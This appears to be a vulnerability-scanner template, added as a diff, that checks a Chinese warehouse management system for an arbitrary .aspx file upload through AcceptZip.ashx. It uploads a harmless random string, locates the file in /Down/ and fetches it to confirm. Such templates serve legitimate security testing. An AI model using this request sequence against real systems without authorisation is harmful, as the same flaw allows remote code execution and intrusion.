@@ -1,0 +1,66 @@
+id: poc-yaml-zzskzy-wms-acceptzip-anyfile-upload
+info:
+  name: 郑州时空 仓储精细化管理系统 AcceptZip 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    郑州时空 仓储精细化管理系统 AcceptZip endpoint allows arbitrary file uploads, leading to potential remote code execution.
+
+variables:
+  t1: "{{rand_text_alphanumeric(16)}}"
+  t2: "{{date_time('%H:%M')}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/AcceptZip.ashx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK"
+    body: |-
+      ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: text/plain
+
+      {{t1}}
+      ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+
+  - id: fetch-directory
+    method: GET
+    path:
+      - "{{BaseURL}}/Down/"
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "{{t2}}           16 <A HREF=\"/Down/(?P<file>[0-9.]+).aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Down/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
